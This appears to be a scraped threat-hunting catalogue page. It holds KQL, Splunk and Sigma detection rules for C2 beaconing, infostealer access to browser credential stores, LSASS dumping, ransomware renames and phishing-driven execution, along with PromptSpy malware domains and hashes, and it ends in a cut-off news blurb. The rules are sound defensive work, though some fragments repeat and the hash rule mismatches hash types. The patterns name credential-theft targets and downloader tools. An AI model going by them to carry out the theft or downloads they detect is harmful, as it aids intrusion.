Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High

ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2020-22653", "CVE-2020-22658", "CVE-2023-25717", "CVE-2025-2492")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2020-22653", "CVE-2020-22658", "CVE-2023-25717", "CVE-2025-2492")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

| where files > 200

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] PromptSpy dropper APK sample hash landing on monitored endpoint · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] PromptSpy Android GenAI malware C2/distribution domain contact (mgardownload.com, m-mgarg.com) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
PromptSpy Android GenAI malware C2/distribution domain contact (mgardownload.com, m-mgarg.com) AICommand & Control High
Hunts network/DNS resolution of the two PromptSpy domains named in ESET's H1 2026 report: mgardownload[.]com (served the malicious 'MorganArg'/JPMorgan-themed dropper APK) and m-mgarg[.]com (webpage opened post-install, staging the VNC/Gemini C2 flow). Any corporate DNS resolver, proxy, or MDM-managed device touching these is a PromptSpy indicator, not a generic beacon template. Rationale: Both domains are explicitly attributed to PromptSpy by ESET's dedicated write-up (VirusTotal shows all four droppers served from mgardownload[.]com; the dropper opens m-mgarg[.]com on launch) and confirmed by The Hacker News / Cybersecurity News, so they are high-fidelity and non-generic. Dropped the AWS/Cloudflare IPs (54.67.2.84, 52.222.205.45, 104.21.91.170) as shared hosting with no second-source PromptSpy attribution. Cross-checked against: • https://www.welivesecurity.com/en/eset-research/promptspy-ushers-in-era-android-threats-using-genai/ • https://thehackernews.com/2026/02/promptspy-android-malware-abuses-google.html • https://cybersecuritynews.com/promptspy-android-ai-malware/ • https://github.com/eset/malware-ioc
ATT&CKT1071.001 T1105
Data sourcesNetwork_Resolution.DNS Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • SOC analyst or TI enrichment tooling (URLScan, VirusTotal, ANY.RUN) resolving the domain from a lab/analyst workstation during IOC research
  • Passive-DNS / sinkhole collectors that log resolutions of known-bad domains
  • Security web proxy that pre-resolves URLs in blocked email for detonation
  • Managed Android (MDM/Intune) test device intentionally detonating the sample in a sandbox VLAN
Response runbook
1) Triage: identify the querying host/user and whether it is an analyst/sandbox asset or a real user endpoint; check if the resolution succeeded and whether any follow-on connection to the returned IP occurred. For Android, pull MDM inventory for a 'MorganArg'/JPMorgan-lookalike package. 2) Contain: sink-hole/block both domains at DNS and proxy; if a managed device, isolate it and initiate mobile-threat-defense scan; block the resolved IPs at egress. 3) Hunt: pivot on the resolved IPs across DeviceNetworkEvents/firewall for other internal talkers, search DeviceFileEvents/download logs for the APK sample SHA1s (see companion UC), and review any VNC-style outbound sessions from mobile subnets.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("mgardownload.com","m-mgarg.com")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
union isfuzzy=true
 (DnsEvents
   | where TimeGenerated > ago(30d)
   | where Name has_any ("mgardownload.com","m-mgarg.com")
   | project TimeGenerated, Host=Computer, SrcIP=ClientIP, Domain=Name),
 (CommonSecurityLog
   | where TimeGenerated > ago(30d)
   | where DestinationDnsDomain has_any ("mgardownload.com","m-mgarg.com") or RequestURL has_any ("mgardownload.com","m-mgarg.com")
   | project TimeGenerated, Host=SourceHostName, SrcIP=SourceIP, Domain=coalesce(DestinationDnsDomain, RequestURL))
| order by TimeGenerated desc

PromptSpy dropper APK sample hash landing on monitored endpoint AIDelivery Medium
Hunts the nine PromptSpy dropper APK SHA1 hashes from the ESET H1 2026 IOC bundle appearing in file telemetry — e.g. an APK downloaded to a Windows workstation/file share for sideloading, staged on a jump box, or synced from mobile backup. Exact-hash match, so any hit is the actual sample, not a lookalike. Rationale: The nine SHA1 values are the ESET-published PromptSpy dropper samples (mirrored in the eset/malware-ioc GitHub repo and VirusTotal), so an exact match is unambiguous. Detection is on file telemetry because these are Android APKs that won't execute as Windows processes — they only surface if the sample is downloaded/staged on a monitored endpoint or file share. Datadog/Falcon left empty: neither reliably carries file-write SHA1 for non-executed APKs. Cross-checked against: • https://github.com/eset/malware-ioc • https://www.welivesecurity.com/en/eset-research/promptspy-ushers-in-era-android-threats-using-genai/
ATT&CKT1105 T1204.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware analyst deliberately downloading/storing the PromptSpy sample on a lab or research workstation
  • EDR/AV quarantine or backup copy of the sample retaining the original hash
  • Threat-intel sample-repo sync (MISP, internal malware zoo) landing files on a collector host
  • IR responder copying a captured sample to a case-evidence share
Suppression filter
| where not (FolderPath has "\\Quarantine\\" or FolderPath has "\\MalwareSamples\\" or FolderPath has "\\Evidence\\")
Response runbook
1) Triage: confirm the host role — analyst/lab/evidence host vs. a normal user endpoint; inspect FolderPath and FileOriginUrl to see whether it arrived via download (mgardownload[.]com) vs. a research tool, and identify the acquiring user/process. 2) Contain: if a production user endpoint, isolate it, delete/quarantine the APK, and check for onward transfer to any Android device via USB/MDM sideload; block the source URL. 3) Hunt: pivot the FileOriginUrl and downloading host into the companion domain-resolution UC, sweep other endpoints/file shares for the same SHA1 set, and review mobile fleet for the installed 'MorganArg'/JPMorgan-lookalike package.
DeviceFileEvents
| where Timestamp > ago(30d)
| where SHA1 in ("6bbc9ab132ba066f63676e05da13d108598bc29b","375d7423e63c8f5f2cc814e8cfe697ba25168afa","3978ac5cd14e357320e127d6c87f10cb70a1dcc2","e60d12017d2da579df87368f5596a0244621ae86","9b1723284e311794987997cb7e8814eb6014713f","076801bd9c6eb78fc0331a4c7a22c73199cc3824","8364730e9bb2cf3a4b016de1b34f38341c0ee2fa","f8f4c5bc498bcce907dc975dd88be8d594629909","c14e9b062ed28115ede096788f62b47a6ed841ac")
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA1, FileOriginUrl, InitiatingProcessAccountName, InitiatingProcessFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileSHA1 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b","375d7423e63c8f5f2cc814e8cfe697ba25168afa","3978ac5cd14e357320e127d6c87f10cb70a1dcc2","e60d12017d2da579df87368f5596a0244621ae86","9b1723284e311794987997cb7e8814eb6014713f","076801bd9c6eb78fc0331a4c7a22c73199cc3824","8364730e9bb2cf3a4b016de1b34f38341c0ee2fa","f8f4c5bc498bcce907dc975dd88be8d594629909","c14e9b062ed28115ede096788f62b47a6ed841ac")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetFilePath, TargetFileName, TargetFileSHA1
| order by TimeGenerated desc

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"

| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

     | `drop_dm_object_name(All_Email)`

    [| tstats summariesonly=false earliest(_time) AS exec_time

         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",

         by Processes.dest, Processes.user

| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac") or SHA1 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac") or MD5 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac") or SHA1 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac") or MD5 in~ ("6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6bbc9ab132ba066f63676e05da13d108598bc29b", "375d7423e63c8f5f2cc814e8cfe697ba25168afa", "3978ac5cd14e357320e127d6c87f10cb70a1dcc2", "e60d12017d2da579df87368f5596a0244621ae86", "9b1723284e311794987997cb7e8814eb6014713f", "076801bd9c6eb78fc0331a4c7a22c73199cc3824", "8364730e9bb2cf3a4b016de1b34f38341c0ee2fa", "f8f4c5bc498bcce907dc975dd88be8d594629909", "c14e9b062ed28115ede096788f62b47a6ed841ac"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Critical

15-Year-Old GhostLock Flaw Enables Root and Container Escape on Most Linux Distros

The Hacker News
2026-07-08 8 use cases 3 techniques 6 kill-chain phases detected

Researchers at&nbsp;Nebula Security&nbsp;have disclosed GhostLock (CVE-2026-43499), a 15-year-old Linux kernel flaw that lets any logged-in user take full&nbsp;root&nbsp;control of a machine that has not been patched. The vulnerable code has shipped by default in essentially every mainstream distribution since 2011. The flaw needs no special permission, no unusual settings, and no network

